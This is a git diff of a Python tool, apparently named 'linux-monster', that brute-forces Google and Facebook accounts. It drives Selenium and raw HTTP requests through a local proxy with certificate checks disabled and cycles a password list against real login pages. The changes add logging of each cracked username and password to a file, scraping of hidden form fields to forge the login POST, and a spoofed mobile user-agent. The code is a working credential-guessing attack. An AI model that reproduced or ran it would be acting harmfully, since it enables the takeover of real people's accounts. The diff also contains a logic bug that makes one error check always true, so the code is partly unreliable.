@@ -9,6 +9,8 @@ import json
 import random
 import logging
 import traceback
+import subprocess
+import selenium
 from selenium import webdriver
 from selenium.webdriver.common.by import By
 from selenium.webdriver.common.keys import Keys
@@ -239,21 +241,24 @@ def proxy_errorV(errorLogged = None, terminate = None):
       onload_proxy(pop = terminate)
       logging.error(errorLogged)
       print(f'{red}Proxy connection failed{plain}')
-    if 'net::ERR_CONNECTION_REFUSED' in errorLogged:
+    if 'net::ERR_CONNECTION_REFUSED' or 'net::ERR_PROXY_CONNECTION_FAILED' in errorLogged:
       logging.warning(errorLogged)
-      print(f'{yellow}If proxy is enabled...Run "python server.py" before trying again {plain}')
+      print(f'{red}If proxy is enabled...Run "python server.py" before trying again{plain}')
       
     else:
       print(errorLogged)
       
-      
+    
 def main(): 
   password_file = settings[5].split(':')[1]
   logging.basicConfig(filename='monster.log', format = "%(asctime)s - %(levelname)s - %(message)s")
   
   with open(onload_file(password_file), 'r') as file:
-            pass_ = file.readlines()
-            
+    pass_ = [passw.strip() for passw in file.readlines() if passw.strip()]
+    
+  save_passwords = open('data/temps.txt', 'a')
+    
+
   holder = rf"""
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    _,  _ _, _ _,_ _  ,   _, _  _, _, _  _, ___ __, __,
@@ -266,20 +271,22 @@ def main():
    
    {dp_blue}𝙱𝚛𝚞𝚝𝚎-𝚏𝚘𝚛𝚌𝚎           {dp_blue}𝙿𝚊𝚢𝚕𝚘𝚊𝚍
    {green}𝙷𝚝𝚖𝚕 𝚜𝚔𝚒𝚗𝚗𝚎𝚛          {green}𝙳𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚛
-   {yellow}𝚂𝚎𝚝𝚝𝚒𝚗𝚐𝚜              {red}𝙴𝚡𝚒𝚝{plain} 
+   {yellow}𝚂𝚎𝚝𝚝𝚒𝚗𝚐𝚜              𝙷𝚎𝚕𝚙
+   {red}𝙴𝚡𝚒𝚝{plain} 
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    {blue_bg}𝙶𝚒𝚝𝚑𝚞𝚋 - 𝚜𝚑𝚊𝚍𝚎[𝚑𝚊𝚛𝚔𝚎𝚛𝚋𝚢𝚝𝚎]{plain}  𝚂𝚝𝚊𝚝𝚞𝚜 - {check_connection()}
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   """
   
+  print(f'{blue}{textwrap.dedent(holder)}{plain}')
   bs = beautifulsoup
   command = True
   while command:
-    print(f'{blue}{textwrap.dedent(holder)}{plain}')
     command = input(f'{yellow}𝙴𝚗𝚝𝚎𝚛 𝚊 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 𝚒.𝚎 [𝚑𝚝𝚖𝚕 𝚘𝚛 𝚑𝚝𝚖𝚕-𝚜𝚔𝚒𝚗𝚗𝚎𝚛] : {plain}')
     if command.lower() in ['brute', 'brute-force']:
-      temp_disable = input(f'{blue}Temporarily disable proxy for now, [Yes | No] : {plain}').lower()
-      disable_now = True if temp_disable.strip() == "yes" else False
+      if sanitize_json_bool(settings[2].strip()):
+        temp_disable = input(f'{blue}Temporarily disable proxy for now [Yes | No] : {plain}').lower()
+        disable_now = True if temp_disable.strip() == "yes" else False
       br = True
       while br:
         target = """
@@ -301,9 +308,10 @@ def main():
           caught_proxy = onload_proxy()
           if caught_proxy != None and disable_now == False:
             options.add_argument('--proxy-server=127.0.0.1:8000')
+            options.add_argument('ignore-certificate-errors')
             sign_in_tar = 'http://127.0.0.1:8000/accounts.google.com/v3/signin/identifier?dsh=S1812573153%3A1655944654029516&flowEntry=ServiceLogin&flowName=WebLiteSignIn&ifkv=AX3vH39E0iYVTmn-NoMNM_C35EPrno8LWsRx2Qhr0HApkVLZ-Zc_Vql8ouaSQOiXzEmthrpOPAV5'
-          else:
-            sign_in_tar = 'https://accounts.google.com/v3/signin/identifier?dsh=S1812573153%3A1655944654029516&flowEntry=ServiceLogin&flowName=WebLiteSignIn&ifkv=AX3vH39E0iYVTmn-NoMNM_C35EPrno8LWsRx2Qhr0HApkVLZ-Zc_Vql8ouaSQOiXzEmthrpOPAV5'
+          
+          sign_in_tar = 'https://accounts.google.com/v3/signin/identifier?dsh=S1812573153%3A1655944654029516&flowEntry=ServiceLogin&flowName=WebLiteSignIn&ifkv=AX3vH39E0iYVTmn-NoMNM_C35EPrno8LWsRx2Qhr0HApkVLZ-Zc_Vql8ouaSQOiXzEmthrpOPAV5'
           try:
             driver = webdriver.Chrome(options = options)
             driver.get(sign_in_tar)
@@ -339,17 +347,19 @@ def main():
                 response_ = bs(driver.page_source, 'html.parser').text
                 if "Wrong password" in response_:
                   print(f'{red}Incorrect password : {check_password} {plain}')
+                  
                 elif "Confirm that you\'re not a robot" in response_:
                   captcha_con = captcha.extend(check_password)
                   print(f'{red}Captcha detected {plain}')
                   if len(captcha) > 5:
-                    print('The server keeps calling me a bot, i should just go to sleep 💤...You should too')
+                    print(f'{red}The server keeps calling me a bot, i should just go to sleep now💤...You should too{plain}')
                     driver.quit()
                     break
                 
                 elif r"You're signed in" in response_ or   r"Recovery information" in response_:
                   print(f'{green}Correct password : {check_password}{plain}')
                   driver.quit()
+                  save_passwords.write(f'{username_email} - {check_password} - Google - {time.time()}\n')
                   break
               except Exception:
                 page_ = bs(driver.page_source, 'html.parser')
@@ -376,11 +386,12 @@ def main():
           for i in range(len(pass_)):
             check_password = pass_[i]
             caught_proxy = onload_proxy()
-            if caught_proxy != None and disable_now ==False:
+            if caught_proxy != None and disable_now == False:
               options.add_argument('--proxy-server=127.0.0.1:8000')
-              sign_in_face = 'http://127.0.0.1:8000/www.facebook.com/login.php/?wtsid=rdr_0f3dD3Sv9vasSu1yl&_rdc=2&_rdr#'
+              sign_in_face = 'http://127.0.0.1:8000/https://m.facebook.com/?rcs=ATA8kUHTRamaHaCJtN302QdoJ--JpWwH6lhmnM2RoDZg4Qhlcjh4PXiAKViPL4Cqs4ny1uovx6g5QLOJbR6VAF7SXHQXmUb_b57xLaow_r7XeSdpxp9z8mwJ5ULrsncUrrFS7HRi4wYpaaEfoY-ekIzQ2y-mhoIxIN8FnA'
+              options.add_argument('ignore-certificate-errors')
             else:
-              sign_in_face = 'https://www.facebook.com/login.php/?wtsid=rdr_0f3dD3Sv9vasSu1yl&_rdc=2&_rdr#'
+              sign_in_face = 'https://m.facebook.com/?rcs=ATA8kUHTRamaHaCJtN302QdoJ--JpWwH6lhmnM2RoDZg4Qhlcjh4PXiAKViPL4Cqs4ny1uovx6g5QLOJbR6VAF7SXHQXmUb_b57xLaow_r7XeSdpxp9z8mwJ5ULrsncUrrFS7HRi4wYpaaEfoY-ekIzQ2y-mhoIxIN8FnA'
             driver = webdriver.Chrome(options = options)
             try:
               driver.get(sign_in_face)
@@ -394,7 +405,7 @@ def main():
                   
               if r"temporarily blocked" not in page_:
                 if 'Error' in page_:
-                  print(page_)
+                  print(red+page_+plain)
                   break
                       
                 wait = WebDriverWait(driver,30)
@@ -409,8 +420,8 @@ def main():
                 username_field.send_keys(username_email)
                 password_field.send_keys(check_password)
                 
-                print(f'\n{green}[{username_email}] 𝚃𝚛𝚢𝚒𝚗𝚐 𝚙𝚊𝚜𝚜𝚠𝚘𝚛𝚍 : {check_password}{plain}', end = '', flush = True)
-                    
+                print(f'{green}[{username_email}] 𝚃𝚛𝚢𝚒𝚗𝚐 𝚙𝚊𝚜𝚜𝚠𝚘𝚛𝚍 : {check_password}{plain}', flush = True)
+                
                 wait.until(EC.visibility_of_element_located((By.XPATH, '//button[contains(text(), "Log in")]')))
                 driver.find_element(By.XPATH,'//button[contains(text(), "Log in")]').click()
                 try:
@@ -418,10 +429,13 @@ def main():
                   wait.until(EC.visibility_of_element_located((By.XPATH, '//div[contains(text(), "incorrect")] | //div[contains(text(),  "Check your notifications on another device")]')))
                   page_content = bs(driver.page_source, 'html.parser').text
                   if "incorrect" in page_content:
-                    print(f'{red}𝙸𝚗𝚌𝚘𝚛𝚛𝚎𝚌𝚝 𝚙𝚊𝚜𝚜𝚠𝚘𝚛𝚍{plain}')
+                    print(f'{red}𝙸𝚗𝚌𝚘𝚛𝚛𝚎𝚌𝚝 𝚙𝚊𝚜𝚜𝚠𝚘𝚛𝚍{plain}', flush = True)
+                    
                   elif "Check your notifications on  another device" in page_content:
-                    print(f'{red}Correct password {check_password} [{yellow} might have 2 factor authentication {plain}]')
+                    print(f'{red}Correct password {check_password} [{yellow} might have 2 factor authentication {plain}]', flush = True)
+                    
                     driver.quit()
+                    save_passwords.write(f'{username_email} - {check_password} - Facebook - {time.time()}\n')
                     break
                   else:
                     print(f'{green} {check_password} is the correct password{plain}')
@@ -429,13 +443,18 @@ def main():
                     break
                   
                 except selenium.common.exceptions.TimeoutException as sel_timer:
+                  page_now = bs(driver.page_source, 'html.parser').text
+                  if "find your account" in page_now:
+                    print(f'{red}Couldn\'t find the account {username_email}{plain}')
+                    break
+                  
                   logging.critical(sel_timer)
-                  print(f'{red}Timeout{plain}')
+                  print(f'{red}Await response timeout{plain}')
                   pass
                     
                 except selenium.common.exceptions.NoSuchElementException as sel_err:
                   logging.error(sel_err)
-                  print(f'{red}Skip{plain}')
+                  print(f'{red}Kindly inform the developer of this error, when spotted{plain}')
               else:
                 print(f'{red}Requests have been temporarily blocked{plain}')
                
@@ -459,22 +478,44 @@ def main():
       if username_email.lower() in ['exit']:
         break
       
-      target_url = 'https://facebook.com/login.php'
+      target_url = 'https://www.facebook.com/login.php/?wtsid=rdr_0f3dD3Sv9vasSu1yl&_rdc=2&_rdr#'
       i = 0
       while i < len(pass_):
         check_password = pass_[i]
+        agent = {
+          "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/537.36",
+          "Content-Type" : "Html"
+        }
         caught_proxy = onload_proxy(data = dict)
         response = requests.get(target_url, proxies = caught_proxy)
         cookies = {i.name : i.value for i in response.cookies}
+        
         target_ = bs(response.text, 'html.parser')
+        post_url = target_.find('form', attrs = {'action' : True}).get('action')
+        hidden_input = target_.find_all('input', attrs = {'type' : 'hidden'})
+        made_data = {}
+        for input_tag in hidden_input:
+          name = input_tag.get('name')
+          value = input_tag.get('value', '')
+          if name != None:
+            made_data.update({f'{name}' : f'{value}'})
+            
         form = target_.find_all('form')
         if form:
-          data = {'name':f'{username_email}', 'pass':f'{check_password}'}
-          data_sent = requests.post(target_url, data = data, cookies = cookies, proxies = caught_proxy)
+          made_data.update({'name':f'{username_email}'})
+          made_data.update({'pass': f'{check_password}'})
           
-          print(f'{green}[{username_email}] Trying password : {check_password}')
-          if 'Find friends' in data_sent.text or 'Check your notifications on another device' in data_sent.text or 'authentication' in data_sent.text:
-            print(f'{green}[{username_email}] Password found : {check_password}')
+          data_sent = requests.post(f'{response.url}{post_url}', data = made_data, cookies = cookies, headers = agent, proxies = caught_proxy)
+          
+          data_sent = bs(data_sent.text, 'html.parser').text
+          print(f'{green}Trying password : {check_password} {plain}')
+          
+          if 'Find friends' in data_sent or 'Check your notifications on another device' in data_sent or 'authentication' in data_sent:
+            print(f'{green}[{username_email}] Password found : {check_password} {plain}')
+            save_passwords.write(f'{username_email} - {check_password} - Facebook - {time.time()}\n')
+            break
+          elif 'Find account' in data_sent:
+            print(f'{red}Couldn\'t find the account {username_email}{plain}')
             break
           
         i += 1
@@ -529,6 +570,7 @@ def main():
                 
                 if html_extract.lower() == 'exit':
                   provide_web = False
+                  skinning = False
                 
             
                 elements_extracted = []
@@ -596,11 +638,18 @@ def main():
       
     elif command.lower() in ['setting', 'settings']:
       open_settings(modify = True)
-     
+    
+    elif command.lower().strip() == 'help':
+      subprocess.run(['xdg-open', 'https://github.com/harkerbyte/linux-monster#support'])
+      
+    elif command.lower() in ['dev', 'developer']:
+      subprocess.run(['xdg-open', 'https://github.com/harkerbyte'])
     elif command.lower() in ['exit']:
       command = False
+      os.system('cls' if os.name == 'nt' else 'clear')
       break
     
   
 if __name__ == "__main__":
+  os.system('cls' if os.name == 'nt' else 'clear') 
   main()
